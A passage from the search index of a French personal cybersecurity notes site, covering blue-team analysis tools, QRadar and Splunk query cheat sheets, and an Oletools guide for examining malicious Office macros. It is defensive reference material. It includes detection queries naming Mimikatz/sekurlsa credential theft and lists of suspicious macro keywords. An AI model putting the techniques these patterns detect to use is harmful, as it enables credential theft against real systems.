{"config":{"lang":["fr"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"Home","text":"<p>Le but de ce site est de condenser mes notes, notamment dans le domaine de la cybers\u00e9curit\u00e9. </p> <p>Il s'agit d'un projet que je maintiens sur mon temps libre et, n'\u00e9tant qu'un simple humain, des erreurs ou approximations peuvent se glisser ici et l\u00e0 : n'h\u00e9sitez pas \u00e0 me les communiquer !</p> <p>@Linkedin</p>"},{"location":"#certifications","title":"Certifications","text":""},{"location":"#prolabs","title":"Prolabs","text":""},{"location":"Blue%20Team/Analyse/Outils%20en%20ligne/","title":"Outils en ligne","text":""},{"location":"Blue%20Team/Analyse/Outils%20en%20ligne/#analyse-et-investigation","title":"\ud83d\udd0e Analyse et Investigation","text":""},{"location":"Blue%20Team/Analyse/Outils%20en%20ligne/#scanner-durl","title":"Scanner d'URL","text":"<ul> <li>\ud83d\udccc Scanner et analyse d\u2019URL : \ud83d\udd17 urlscan.io</li> </ul>"},{"location":"Blue%20Team/Analyse/Outils%20en%20ligne/#couteau-suisse-pour-encodagedecodage","title":"Couteau suisse pour encodage/d\u00e9codage","text":"<ul> <li>\ud83d\udd22 Outil polyvalent pour encodage, d\u00e9codage, hashing, transformation de donn\u00e9es : \ud83d\udd17 CyberChef</li> </ul>"},{"location":"Blue%20Team/Analyse/Outils%20en%20ligne/#verifier-la-legitimite-dun-hash-dune-url-dun-fichier","title":"V\u00e9rifier la l\u00e9gitimit\u00e9 d'un hash, d'une URL, d'un fichier","text":"<ul> <li>\ud83d\udee1\ufe0f Multi-scanner d\u2019antivirus et intelligence sur les fichiers malveillants : \ud83d\udd17 VirusTotal</li> </ul>"},{"location":"Blue%20Team/Analyse/Outils%20en%20ligne/#evaluer-la-confiance-en-un-domaine-ou-un-email-utile-pour-spamphishing","title":"\u00c9valuer la confiance en un domaine ou un email (utile pour spam/phishing)","text":"<ul> <li>\ud83d\udcec Analyse de la r\u00e9putation d'un domaine, email, site web : \ud83d\udd17 ScamDoc</li> </ul>"},{"location":"Blue%20Team/Analyse/Outils%20en%20ligne/#base-de-donnees-dexploits-et-de-vulnerabilites","title":"Base de donn\u00e9es d'exploits et de vuln\u00e9rabilit\u00e9s","text":"<ul> <li>\ud83d\udc80 R\u00e9f\u00e9rencement des exploits publics : \ud83d\udd17 Exploit-DB</li> </ul>"},{"location":"Blue%20Team/Analyse/Outils%20en%20ligne/#whois-et-renseignements-sur-les-domaines","title":"Whois et renseignements sur les domaines","text":"<ul> <li>\ud83c\udf10 R\u00e9cup\u00e9ration d'informations WHOIS sur un domaine ou une IP : \ud83d\udd17 Whois.com</li> </ul>"},{"location":"Blue%20Team/Analyse/Outils%20en%20ligne/#sandboxes-pour-lanalyse-de-malware","title":"\ud83d\udda5\ufe0f Sandboxes pour l'Analyse de Malware","text":""},{"location":"Blue%20Team/Analyse/Outils%20en%20ligne/#sandbox-gratuites","title":"\ud83d\udd0d Sandbox Gratuites","text":"Nom Description Lien Any.Run Sandbox interactive permettant d'ex\u00e9cuter des malwares en temps r\u00e9el avec une interface utilisateur \ud83d\udd17 any.run Hybrid Analysis Analyse automatique de fichiers et URL avec score de menace \ud83d\udd17 hybrid-analysis.com Joe Sandbox Cloud Basic Analyse avanc\u00e9e de malwares avec support de Windows, Android, macOS et Linux \ud83d\udd17 joe.security Valkyrie Comodo Plateforme d\u2019analyse de fichiers suspect\u00e9s d\u2019\u00eatre malveillants \ud83d\udd17 valkyrie.comodo.com MetaDefender Cloud Ex\u00e9cution de fichiers et d\u00e9tection des menaces par des moteurs d'analyse multiples \ud83d\udd17 metadefender.opswat.com IRIS-H Sandbox d\u00e9velopp\u00e9e par Quarkslab permettant l\u2019analyse dynamique de malwares \ud83d\udd17 iris-h.quarkslab.com CAPE Sandbox Fork de Cuckoo, sp\u00e9cialis\u00e9 dans l'analyse des malwares avec injection de code et exploits \ud83d\udd17 cape.contextis.com Triage (Hatching) Analyse avanc\u00e9e des malwares avec support des ransomwares et des loaders \ud83d\udd17 triage.hatching.io"},{"location":"Blue%20Team/Analyse/Outils%20en%20ligne/#sandbox-payantes-offrant-parfois-une-version-gratuite-limitee","title":"\ud83d\udcb0 Sandbox Payantes (Offrant parfois une version gratuite limit\u00e9e)","text":"Nom Description Lien Joe Sandbox Cloud Pro Version avanc\u00e9e de Joe Sandbox avec d\u00e9tection plus pouss\u00e9e et plus de ressources \ud83d\udd17 joe.security Falcon Sandbox (ReversingLabs) Plateforme avanc\u00e9e pour l'analyse des malwares et des fichiers suspects \ud83d\udd17 reversinglabs.com VMRay Analyzer Sandbox avanc\u00e9e pour la d\u00e9tection des malwares avec moteur de d\u00e9tection propri\u00e9taire \ud83d\udd17 vmray.com ThreatGrid (Cisco) Sandbox Cisco offrant une int\u00e9gration avanc\u00e9e avec SIEM et Threat Intelligence \ud83d\udd17 cisco.com FireEye AX Plateforme d\u2019analyse avanc\u00e9e des menaces avec protection en temps r\u00e9el \ud83d\udd17 fireeye.com"},{"location":"Blue%20Team/Analyse/Outils%20en%20ligne/#analyse-des-navigations-et-du-web","title":"\ud83c\udf0d Analyse des Navigations et du Web","text":""},{"location":"Blue%20Team/Analyse/Outils%20en%20ligne/#sandbox-pour-tester-des-pages-web-sans-risque","title":"Sandbox pour tester des pages web sans risque","text":"<ul> <li>\ud83d\udda5\ufe0f Lancer des sites web suspects dans un navigateur s\u00e9curis\u00e9 : \ud83d\udd17 Browserling</li> </ul>"},{"location":"Blue%20Team/Analyse/Outils%20en%20ligne/#detection-des-technologies-utilisees-sur-un-site-web","title":"D\u00e9tection des technologies utilis\u00e9es sur un site web","text":"<ul> <li>\ud83d\udd27 Identifier CMS, frameworks, outils utilis\u00e9s par un site : \ud83d\udd17 Wappalyzer</li> <li>\ud83c\udfd7\ufe0f Analyse de l'architecture d'un site web (CMS, trackers, outils) : \ud83d\udd17 BuiltWith</li> </ul>"},{"location":"Blue%20Team/Analyse/Outils%20en%20ligne/#renseignement-sur-les-adresses-ip-et-menaces","title":"\ud83d\udd75\ufe0f Renseignement sur les Adresses IP et Menaces","text":""},{"location":"Blue%20Team/Analyse/Outils%20en%20ligne/#geolocalisation-et-historique-dune-ip","title":"G\u00e9olocalisation et historique d'une IP","text":"<ul> <li>\ud83c\udf0d Traquer l'origine d'une adresse IP : \ud83d\udd17 IPinfo.io</li> <li>\ud83d\udcca G\u00e9olocalisation et historique d'une adresse IP : \ud83d\udd17 AbuseIPDB</li> </ul>"},{"location":"Blue%20Team/Analyse/Outils%20en%20ligne/#recherches-osint-sur-des-entites","title":"Recherches OSINT sur des entit\u00e9s","text":"<ul> <li>\ud83d\udd75\ufe0f Recherche et analyse de traces num\u00e9riques : \ud83d\udd17 IntelX</li> <li>\ud83d\udd0d Moteur de recherche OSINT pour emails, noms, domaines : \ud83d\udd17 Spiderfoot</li> </ul>"},{"location":"Blue%20Team/Analyse/Outils%20en%20ligne/#ressources-et-renseignement-sur-les-cybermenaces","title":"\ud83d\udcdc Ressources et Renseignement sur les Cybermenaces","text":""},{"location":"Blue%20Team/Analyse/Outils%20en%20ligne/#indicateurs-de-compromission-ioc-et-threat-intelligence","title":"Indicateurs de compromission (IOC) et Threat Intelligence","text":"<ul> <li>\ud83d\udea8 Plateforme open-source de partage d'IOC et de menaces : \ud83d\udd17 MISP</li> <li>\ud83d\udce1 Base de donn\u00e9es des menaces et campagnes APT : \ud83d\udd17 ATT&amp;CK MITRE</li> <li>\ud83c\udff4 Analyse et veille des groupes de cybercriminels : \ud83d\udd17 ThreatFox</li> <li>\ud83e\udda0 Base de donn\u00e9es des ransomwares actifs : \ud83d\udd17 ID Ransomware</li> </ul>"},{"location":"Blue%20Team/Analyse/SIEM/Qradar/Requ%C3%AAtes/","title":"Requ\u00eates","text":""},{"location":"Blue%20Team/Analyse/SIEM/Qradar/Requ%C3%AAtes/#filtres-de-base","title":"\ud83c\udfaf Filtres de base","text":""},{"location":"Blue%20Team/Analyse/SIEM/Qradar/Requ%C3%AAtes/#rechercher-des-evenements-sur-une-periode-specifique","title":"Rechercher des \u00e9v\u00e9nements sur une p\u00e9riode sp\u00e9cifique","text":"<pre><code>SELECT * FROM events \nWHERE startTime &gt; '2024-02-01 00:00:00' \nAND startTime &lt; '2024-02-07 23:59:59'\n</code></pre> <p>Affiche tous les \u00e9v\u00e9nements entre le 1er et le 7 f\u00e9vrier 2024.</p>"},{"location":"Blue%20Team/Analyse/SIEM/Qradar/Requ%C3%AAtes/#filtrer-par-adresse-ip-source","title":"Filtrer par adresse IP source","text":"<pre><code>SELECT * FROM events WHERE sourceip = '192.168.1.10'\n</code></pre> <p>Affiche tous les \u00e9v\u00e9nements g\u00e9n\u00e9r\u00e9s par l'IP source <code>192.168.1.10</code>.</p>"},{"location":"Blue%20Team/Analyse/SIEM/Qradar/Requ%C3%AAtes/#filtrer-par-type-devenement-specifique","title":"Filtrer par type d\u2019\u00e9v\u00e9nement sp\u00e9cifique","text":"<pre><code>SELECT * FROM events WHERE eventCategory = 'Authentication Failure'\n</code></pre> <p>Affiche tous les \u00e9checs d\u2019authentification.</p>"},{"location":"Blue%20Team/Analyse/SIEM/Qradar/Requ%C3%AAtes/#filtrer-par-niveau-de-gravite","title":"Filtrer par niveau de gravit\u00e9","text":"<pre><code>SELECT * FROM events WHERE magnitude &gt; 6\n</code></pre> <p>Affiche uniquement les \u00e9v\u00e9nements avec une gravit\u00e9 sup\u00e9rieure \u00e0 6.</p>"},{"location":"Blue%20Team/Analyse/SIEM/Qradar/Requ%C3%AAtes/#filtres-avances","title":"\ud83d\udd25 Filtres avanc\u00e9s","text":""},{"location":"Blue%20Team/Analyse/SIEM/Qradar/Requ%C3%AAtes/#rechercher-des-connexions-suspectes","title":"Rechercher des connexions suspectes","text":"<pre><code>SELECT * FROM events WHERE sourceIP != destinationIP\nAND destinationPort IN (3389, 22, 445)\nAND magnitude &gt; 5\n</code></pre> <p>D\u00e9tecte les connexions anormales sur des ports sensibles comme RDP (3389), SSH (22) et SMB (445).</p>"},{"location":"Blue%20Team/Analyse/SIEM/Qradar/Requ%C3%AAtes/#detecter-des-balayages-de-ports","title":"D\u00e9tecter des balayages de ports","text":"<pre><code>SELECT sourceIP, COUNT(DISTINCT destinationPort) AS scanned_ports \nFROM events \nWHERE destinationPort IS NOT NULL \nGROUP BY sourceIP \nHAVING COUNT(DISTINCT destinationPort) &gt; 10\n</code></pre> <p>Identifie les adresses IP ayant scann\u00e9 plus de 10 ports diff\u00e9rents.</p>"},{"location":"Blue%20Team/Analyse/SIEM/Qradar/Requ%C3%AAtes/#lister-les-tentatives-de-connexion-echouees-par-utilisateur","title":"Lister les tentatives de connexion \u00e9chou\u00e9es par utilisateur","text":"<pre><code>SELECT username, COUNT(*) AS failed_attempts \nFROM events \nWHERE eventName = 'Failed Login' \nGROUP BY username \nORDER BY failed_attempts DESC\n</code></pre> <p>Affiche la liste des utilisateurs avec le plus grand nombre d\u2019\u00e9checs de connexion.</p>"},{"location":"Blue%20Team/Analyse/SIEM/Qradar/Requ%C3%AAtes/#identifier-des-connexions-a-des-pays-suspects","title":"Identifier des connexions \u00e0 des pays suspects","text":"<pre><code>SELECT * FROM events \nWHERE destinationGeographicLocation IN ('Russia', 'China', 'North Korea')\n</code></pre> <p>Liste les connexions vers des pays sensibles.</p>"},{"location":"Blue%20Team/Analyse/SIEM/Qradar/Requ%C3%AAtes/#requetes-specifiques-aux-logs-reseau","title":"\ud83d\udcdc Requ\u00eates sp\u00e9cifiques aux logs r\u00e9seau","text":""},{"location":"Blue%20Team/Analyse/SIEM/Qradar/Requ%C3%AAtes/#identifier-des-transferts-de-fichiers-volumineux","title":"Identifier des transferts de fichiers volumineux","text":"<pre><code>SELECT sourceIP, destinationIP, bytes \nFROM flows \nWHERE bytes &gt; 100000000 \nORDER BY bytes DESC\n</code></pre> <p>Affiche les transferts de plus de 100 Mo.</p>"},{"location":"Blue%20Team/Analyse/SIEM/Qradar/Requ%C3%AAtes/#identifier-les-connexions-entre-un-poste-et-plusieurs-destinations","title":"Identifier les connexions entre un poste et plusieurs destinations","text":"<pre><code>SELECT sourceIP, COUNT(DISTINCT destinationIP) AS connections\nFROM flows \nGROUP BY sourceIP\nHAVING COUNT(DISTINCT destinationIP) &gt; 5\n</code></pre> <p>Identifie les postes \u00e9tablissant des connexions vers plus de 5 destinations diff\u00e9rentes (potentiel beaconing).</p>"},{"location":"Blue%20Team/Analyse/SIEM/Qradar/Requ%C3%AAtes/#autres-requetes-utiles","title":"\ud83d\udee0 Autres requ\u00eates utiles","text":""},{"location":"Blue%20Team/Analyse/SIEM/Qradar/Requ%C3%AAtes/#rechercher-un-processus-specifique-dans-les-logs","title":"Rechercher un processus sp\u00e9cifique dans les logs","text":"<pre><code>SELECT * FROM events WHERE eventName LIKE '%powershell%'\n</code></pre> <p>Filtre les \u00e9v\u00e9nements contenant le mot <code>powershell</code>, souvent utilis\u00e9 dans des attaques.</p>"},{"location":"Blue%20Team/Analyse/SIEM/Qradar/Requ%C3%AAtes/#rechercher-des-executions-de-mimikatz","title":"Rechercher des ex\u00e9cutions de Mimikatz","text":"<pre><code>SELECT * FROM events \nWHERE eventName LIKE '%mimikatz%' \nOR eventDescription LIKE '%sekurlsa%'\n</code></pre> <p>D\u00e9tecte les ex\u00e9cutions suspectes de l\u2019outil Mimikatz.</p>"},{"location":"Blue%20Team/Analyse/SIEM/Qradar/Requ%C3%AAtes/#detecter-des-connexions-anormales-dun-compte-privilegie","title":"D\u00e9tecter des connexions anormales d\u2019un compte privil\u00e9gi\u00e9","text":"<pre><code>SELECT username, sourceIP, destinationIP, eventName \nFROM events \nWHERE username IN ('admin', 'administrator', 'root')\nAND eventName = 'Successful Login'\nAND sourceIP NOT IN ('192.168.1.0/24')\n</code></pre> <p>D\u00e9tecte les connexions r\u00e9ussies sur un compte admin depuis une IP hors du r\u00e9seau interne.</p>"},{"location":"Blue%20Team/Analyse/SIEM/Qradar/Requ%C3%AAtes/#trouver-les-evenements-les-plus-frequents","title":"Trouver les \u00e9v\u00e9nements les plus fr\u00e9quents","text":"<pre><code>SELECT eventName, COUNT(*) AS occurrences \nFROM events \nGROUP BY eventName \nORDER BY occurrences DESC\n</code></pre>"},{"location":"Blue%20Team/Analyse/SIEM/Splunk/Requ%C3%AAtes/","title":"Requ\u00eates","text":""},{"location":"Blue%20Team/Analyse/SIEM/Splunk/Requ%C3%AAtes/#requetes-de-base","title":"\ud83c\udfaf Requ\u00eates de Base","text":""},{"location":"Blue%20Team/Analyse/SIEM/Splunk/Requ%C3%AAtes/#recherche-simple","title":"Recherche Simple","text":"<pre><code>index=[nom_index] \"terme sp\u00e9cifique\"`\n</code></pre>"},{"location":"Blue%20Team/Analyse/SIEM/Splunk/Requ%C3%AAtes/#recherche-dans-une-plage-de-temps","title":"Recherche dans une Plage de Temps","text":"<pre><code>index=[nom_index] earliest=-1h latest=now \"terme sp\u00e9cifique\"`\n</code></pre> <p><code>-1h</code> pour la derni\u00e8re heure, <code>now</code> pour le moment actuel.</p>"},{"location":"Blue%20Team/Analyse/SIEM/Splunk/Requ%C3%AAtes/#utiliser-les-jokers","title":"Utiliser les Jokers","text":"<pre><code>index=[nom_index] source=\"*chemin/fichier*log\"`\n</code></pre>"},{"location":"Blue%20Team/Analyse/SIEM/Splunk/Requ%C3%AAtes/#filtrage-et-selection","title":"\ud83d\udcdcFiltrage et S\u00e9lection","text":""},{"location":"Blue%20Team/Analyse/SIEM/Splunk/Requ%C3%AAtes/#filtrer-par-champ","title":"Filtrer par Champ","text":"<pre><code>index=[nom_index] [champ]=[valeur]`\n</code></pre>"},{"location":"Blue%20Team/Analyse/SIEM/Splunk/Requ%C3%AAtes/#utiliser-and-or-not","title":"Utiliser <code>AND</code>, <code>OR</code>, <code>NOT</code>","text":"<pre><code>index=[nom_index] (erreur OR \u00e9chec) AND utilisateurs=\"John Doe\" NOT source=\"/var/log/syslog\"`\n</code></pre>"},{"location":"Blue%20Team/Analyse/SIEM/Splunk/Requ%C3%AAtes/#commandes-statistiques-et-agregation","title":"\ud83d\udcb9 Commandes Statistiques et Agr\u00e9gation","text":""},{"location":"Blue%20Team/Analyse/SIEM/Splunk/Requ%C3%AAtes/#compter-les-occurrences","title":"Compter les Occurrences","text":"<pre><code>index=[nom_index] | stats count`\n</code></pre>"},{"location":"Blue%20Team/Analyse/SIEM/Splunk/Requ%C3%AAtes/#compter-par-categorie","title":"Compter par Cat\u00e9gorie","text":"<pre><code>index=[nom_index] | stats count by [champ]`\n</code></pre>"},{"location":"Blue%20Team/Analyse/SIEM/Splunk/Requ%C3%AAtes/#trouver-des-valeurs-uniques","title":"Trouver des Valeurs Uniques","text":"<pre><code>index=[nom_index] | dedup [champ]`\n</code></pre>"},{"location":"Blue%20Team/Analyse/SIEM/Splunk/Requ%C3%AAtes/#calculs-statistiques-moyenne-max-min-etc","title":"Calculs Statistiques (Moyenne, Max, Min, etc.)","text":"<pre><code>index=[nom_index] | stats avg([champ]), max([champ]), min([champ])`\n</code></pre>"},{"location":"Blue%20Team/Analyse/SIEM/Splunk/Requ%C3%AAtes/#tri-et-limitation","title":"\u267b Tri et Limitation","text":""},{"location":"Blue%20Team/Analyse/SIEM/Splunk/Requ%C3%AAtes/#trier-les-resultats","title":"Trier les R\u00e9sultats","text":"<p><pre><code>index=[nom_index] | sort - [champ]`\n</code></pre> <code>-</code> pour trier en ordre d\u00e9croissant.</p>"},{"location":"Blue%20Team/Analyse/SIEM/Splunk/Requ%C3%AAtes/#limiter-les-resultats","title":"Limiter les R\u00e9sultats","text":"<p><pre><code>index=[nom_index] | head 10`\n</code></pre> Affiche les 10 premiers r\u00e9sultats.</p>"},{"location":"Blue%20Team/Analyse/SIEM/Splunk/Requ%C3%AAtes/#groupement-et-subdivisions","title":"\u2797 Groupement et Subdivisions","text":""},{"location":"Blue%20Team/Analyse/SIEM/Splunk/Requ%C3%AAtes/#grouper-par-champ","title":"Grouper par Champ","text":"<pre><code>index=[nom_index] | stats count by [champ]`\n</code></pre>"},{"location":"Blue%20Team/Analyse/SIEM/Splunk/Requ%C3%AAtes/#utiliser-timechart-pour-des-tendances-temporelles","title":"Utiliser <code>timechart</code> pour des Tendances Temporelles","text":"<pre><code>index=[nom_index] | timechart count by [champ]`\n</code></pre>"},{"location":"Blue%20Team/Analyse/SIEM/Splunk/Requ%C3%AAtes/#recherche-avancee","title":"\ud83d\udd25 Recherche Avanc\u00e9e","text":""},{"location":"Blue%20Team/Analyse/SIEM/Splunk/Requ%C3%AAtes/#recherche-avec-sous-requetes","title":"Recherche avec Sous-requ\u00eates","text":"<pre><code>index=[nom_index] [ search index=[autre_index] [champ]=[valeur] ]`\n</code></pre>"},{"location":"Blue%20Team/Analyse/SIEM/Splunk/Requ%C3%AAtes/#jointures-entre-sources-de-donnees","title":"Jointures entre Sources de Donn\u00e9es","text":"<pre><code>index=[nom_index1] | join type=outer [champ] [ search index=[nom_index2] ]`\n</code></pre>"},{"location":"Blue%20Team/Analyse/SIEM/Splunk/Requ%C3%AAtes/#extraction-et-transformation","title":"\ud83d\udcb1 Extraction et Transformation","text":""},{"location":"Blue%20Team/Analyse/SIEM/Splunk/Requ%C3%AAtes/#extraire-des-champs-automatiquement","title":"Extraire des Champs Automatiquement","text":"<pre><code>index=[nom_index] | extract`\n</code></pre>"},{"location":"Blue%20Team/Analyse/SIEM/Splunk/Requ%C3%AAtes/#renommer-des-champs","title":"Renommer des Champs","text":"<pre><code>index=[nom_index] | rename [ancien_nom] as [nouveau_nom]`\n</code></pre>"},{"location":"Blue%20Team/Analyse/SIEM/Splunk/Requ%C3%AAtes/#utiliser-eval-pour-des-calculs-ou-transformations","title":"Utiliser <code>eval</code> pour des Calculs ou Transformations","text":"<pre><code>index=[nom_index] | eval [nouveau_champ]=[expression]`\n</code></pre>"},{"location":"Blue%20Team/Analyse/SIEM/Splunk/Requ%C3%AAtes/#visualisation-et-exportation","title":"\u2611 Visualisation et Exportation","text":""},{"location":"Blue%20Team/Analyse/SIEM/Splunk/Requ%C3%AAtes/#generer-un-tableau","title":"G\u00e9n\u00e9rer un Tableau","text":"<pre><code>index=[nom_index] | table [champ1] [champ2] [champ3]`\n</code></pre>"},{"location":"Blue%20Team/Analyse/SIEM/Splunk/Requ%C3%AAtes/#exporter-des-resultats","title":"Exporter des R\u00e9sultats","text":"<pre><code>index=[nom_index] | outputcsv [nom_fichier.csv]\n</code></pre>"},{"location":"Blue%20Team/Analyse/doc/OleTools/","title":"OleTools","text":"<p>Objectif : Oletools est une suite d'outils Python d\u00e9velopp\u00e9e par Philippe Lagadec, con\u00e7ue pour l'analyse des fichiers OLE2 (Compound File Binary Format), principalement les documents Microsoft Office (Word, Excel, PowerPoint), ainsi que les fichiers RTF et Flash. Elle est largement utilis\u00e9e en analyse de malwares (documents malveillants), en forensic et en threat hunting pour extraire des informations, d\u00e9tecter des macros VBA, des objets embarqu\u00e9s, et d'autres indicateurs suspects.</p> <p>Source : https://github.com/decalage2/oletools Installation : <code>pip install -U oletools</code></p>"},{"location":"Blue%20Team/Analyse/doc/OleTools/#workflow-danalyse-suggere","title":"\ud83d\udca1 Workflow d'Analyse Sugg\u00e9r\u00e9","text":"<ol> <li><code>oleid</code> : Obtenir un aper\u00e7u rapide des indicateurs de risque (macros, objets OLE, Flash...).</li> <li><code>olemeta</code> : Examiner les m\u00e9tadonn\u00e9es (auteur, dates, etc.).</li> <li>Si Macros d\u00e9tect\u00e9es :<ul> <li><code>olevba</code> : Analyser et extraire le code VBA, d\u00e9tecter les fonctions suspectes.</li> <li><code>mraptor</code> : D\u00e9tection heuristique rapide de patterns malveillants dans les macros.</li> </ul> </li> <li>Si Objets OLE/Flash/RTF :<ul> <li><code>oledump.py</code> : Lister les flux (streams) du fichier OLE.</li> <li><code>oleobj</code> / <code>rtfobj</code> / <code>pyxswf</code> : Extraire et analyser les objets sp\u00e9cifiques.</li> <li><code>oletimes</code> : Examiner les timestamps de cr\u00e9ation/modification des flux.</li> <li><code>olemap</code> : Visualiser la structure interne du fichier OLE.</li> </ul> </li> <li>Exploration Manuelle :<ul> <li><code>oledump.py -s &lt;stream_id&gt; -v</code> : D\u00e9compresser et afficher le contenu d'un flux VBA.</li> <li><code>olebrowse</code> : Explorer interactivement la structure du fichier OLE.</li> </ul> </li> </ol>"},{"location":"Blue%20Team/Analyse/doc/OleTools/#outils-principaux-et-utilisation","title":"\ud83d\udee0\ufe0f Outils Principaux et Utilisation","text":""},{"location":"Blue%20Team/Analyse/doc/OleTools/#1-oleid-identification-rapide","title":"1. <code>oleid</code> - Identification Rapide","text":"<ul> <li>Description : Analyse un fichier et affiche une liste d'indicateurs (pr\u00e9sence de macros VBA, d'objets OLE, de Flash, de chiffrement, etc.) pour \u00e9valuer rapidement le risque potentiel. C'est souvent le premier outil \u00e0 utiliser.</li> <li>Usage : <code>oleid &lt;fichier&gt;</code></li> <li>Exemple : <pre><code>oleid document_suspect.doc\n</code></pre></li> <li>Interpr\u00e9tation : Recherchez les indicateurs marqu\u00e9s <code>True</code> ou les avertissements (<code>Risk</code>). La pr\u00e9sence de <code>VBA Macros</code> est un point d'attention majeur qui justifie l'utilisation d'<code>olevba</code>. La pr\u00e9sence d'<code>Object Pool</code> ou <code>Flash</code> sugg\u00e8re l'utilisation d'<code>oleobj</code> ou <code>pyxswf</code>.</li> </ul>"},{"location":"Blue%20Team/Analyse/doc/OleTools/#2-olevba-analyse-de-macros-vba","title":"2. <code>olevba</code> - Analyse de Macros VBA","text":"<ul> <li>Description : Extrait et analyse le code source des macros VBA contenues dans les fichiers MS Office. D\u00e9tecte les mots-cl\u00e9s suspects (auto-ex\u00e9cution comme <code>AutoOpen</code>, <code>Document_Open</code>; acc\u00e8s r\u00e9seau comme <code>Lib \"urlmon\"</code>; \u00e9criture fichier comme <code>Open...For Output</code>; ex\u00e9cution de commandes comme <code>Shell</code>, <code>WScript.Shell</code>), les techniques d'obfuscation (Hex, Base64, Dridex, etc.), et les indicateurs IOC (IP, URL, chemins de fichiers ex\u00e9cutables).</li> <li>Usage : <code>olevba [options] &lt;fichier&gt;</code></li> <li>Options Utiles :<ul> <li><code>-c</code> : Affiche le code VBA d\u00e9sobfusqu\u00e9 et analys\u00e9.</li> <li><code>-a</code> : Analyse automatique (affiche un r\u00e9sum\u00e9 des indicateurs sans le code complet).</li> <li><code>-d</code> : D\u00e9code/d\u00e9sobfusque les cha\u00eenes encod\u00e9es (Hex, Base64, Dridex, etc.) trouv\u00e9es dans le code.</li> <li><code>--reveal</code> : Affiche le code VBA extrait brut, sans analyse ni d\u00e9sobfuscation.</li> <li><code>--deobf</code> : Tente de d\u00e9sobfusquer le code VBA en utilisant des heuristiques.</li> <li><code>-i</code> : Mode interactif pour explorer le code et les variables.</li> </ul> </li> <li>Exemple : <pre><code># Analyse compl\u00e8te avec affichage du code et d\u00e9codage\nolevba -c -d document_macro.xls\n</code></pre></li> <li>Interpr\u00e9tation : Portez une attention particuli\u00e8re aux sections <code>Suspicious Keywords</code>, <code>IOCs</code>, et <code>AutoExec keywords</code>. Examinez le code affich\u00e9 avec <code>-c</code> pour comprendre la logique malveillante. Les indicateurs de risque \u00e9lev\u00e9s (<code>High</code>, <code>Critical</code>) sont \u00e0 prioriser.</li> </ul>"},{"location":"Blue%20Team/Analyse/doc/OleTools/#3-mraptor-detection-rapide-de-macros-malveillantes","title":"3. <code>mraptor</code> - D\u00e9tection Rapide de Macros Malveillantes","text":"<ul> <li>Description : Macro Rapter - D\u00e9tecte les macros VBA suspectes en se basant uniquement sur la pr\u00e9sence de m\u00e9thodes d'auto-ex\u00e9cution (<code>AutoOpen</code>, <code>Document_Open</code>, <code>Workbook_Open</code>, etc.). Plus rapide qu'<code>olevba</code> pour un premier tri tr\u00e8s basique.</li> <li>Usage : <code>mraptor &lt;fichier&gt;</code></li> <li>Exemple : <pre><code>mraptor presentation.ppt\n</code></pre></li> <li>Interpr\u00e9tation : Indique si des macros \u00e0 ex\u00e9cution automatique sont pr\u00e9sentes (<code>SUSPICIOUS</code>). Ne fournit pas de d\u00e9tails sur le code lui-m\u00eame. Doit \u00eatre compl\u00e9t\u00e9 par <code>olevba</code> si positif.</li> </ul>"},{"location":"Blue%20Team/Analyse/doc/OleTools/#4-oledumppy-exploration-des-flux-ole","title":"4. <code>oledump.py</code> - Exploration des Flux OLE","text":"<ul> <li>Description : Outil puissant et flexible pour lister, examiner et extraire les diff\u00e9rents flux (streams) de donn\u00e9es \u00e0 l'int\u00e9rieur d'un fichier OLE2. Permet de comprendre la structure interne du fichier.</li> <li>Usage : <code>oledump.py [options] &lt;fichier&gt;</code></li> <li>Options Utiles :<ul> <li>(sans options) : Liste les flux avec leur index, taille, et nom (si disponible). Les lettres indiquent le type : <code>M</code>=Macro VBA, <code>O</code>=Objet OLE, <code>F</code>=Formulaire VBA.</li> <li><code>-s &lt;index&gt;</code> : S\u00e9lectionne un flux sp\u00e9cifique pour l'analyser avec d'autres options.</li> <li><code>-d</code> : Affiche le contenu hexad\u00e9cimal et ASCII du flux s\u00e9lectionn\u00e9.</li> <li><code>-v</code> : Tente de d\u00e9compresser le code VBA (si le flux est marqu\u00e9 'M'). C'est l'option la plus courante pour voir le code macro brut.</li> <li><code>-x</code> : Affiche le contenu hexad\u00e9cimal brut (sans l'ASCII).</li> <li><code>-S</code> : Affiche le contenu sous forme de cha\u00eenes de caract\u00e8res (utile pour chercher des strings lisibles).</li> <li><code>-e</code> : Extrait tous les objets OLE embarqu\u00e9s trouv\u00e9s dans les flux <code>ObjectPool</code>.</li> <li><code>-D</code> : Extrait le contenu brut du flux s\u00e9lectionn\u00e9 vers la sortie standard (\u00e0 rediriger vers un fichier).</li> <li><code>-p &lt;plugin&gt;</code> : Utilise un plugin pour analyser le flux (ex: <code>-p plugin_http_heuristics</code>, <code>-p plugin_find_xor</code>). Lister avec <code>-P</code>.</li> </ul> </li> <li>Exemple : <pre><code># Lister les flux\noledump.py document.doc\n# Afficher le contenu d\u00e9compress\u00e9 du flux VBA (supposons index 7)\noledump.py -s 7 -v document.doc\n# Extraire le contenu brut du flux 10 dans un fichier\noledump.py -s 10 -D &gt; stream10.bin\n# Extraire les objets OLE\noledump.py -s 12 -e document_avec_objet.doc\n</code></pre></li> <li>Interpr\u00e9tation : Les flux marqu\u00e9s <code>M</code> contiennent g\u00e9n\u00e9ralement du code VBA (\u00e0 analyser avec <code>-v</code> ou <code>olevba</code>). Les flux <code>O</code> indiquent des objets OLE embarqu\u00e9s (\u00e0 extraire avec <code>-e</code> ou <code>oleobj</code>). Les tailles importantes ou les noms suspects peuvent indiquer des donn\u00e9es cach\u00e9es.</li> </ul>"},{"location":"Blue%20Team/Analyse/doc/OleTools/#5-olemeta-extraction-des-metadonnees","title":"5. <code>olemeta</code> - Extraction des M\u00e9tadonn\u00e9es","text":"<ul> <li>Description : Affiche les m\u00e9tadonn\u00e9es standard (propri\u00e9t\u00e9s <code>SummaryInformation</code> et <code>DocumentSummaryInformation</code>) du fichier OLE.</li> <li>Usage : <code>olemeta &lt;fichier&gt;</code></li> <li>Exemple : <pre><code>olemeta rapport.xls\n</code></pre></li> <li>Interpr\u00e9tation : Peut r\u00e9v\u00e9ler l'auteur (<code>Author</code>), le logiciel (<code>CreatingApplication</code>), les dates de cr\u00e9ation/modification (<code>CreateTime</code>, <code>LastSaveTime</code>), le temps total d'\u00e9dition (<code>TotalEditTime</code>), des commentaires. Ces informations peuvent parfois trahir l'origine du fichier, des incoh\u00e9rences (temps d'\u00e9dition nul pour un document complexe), ou des informations contextuelles.</li> 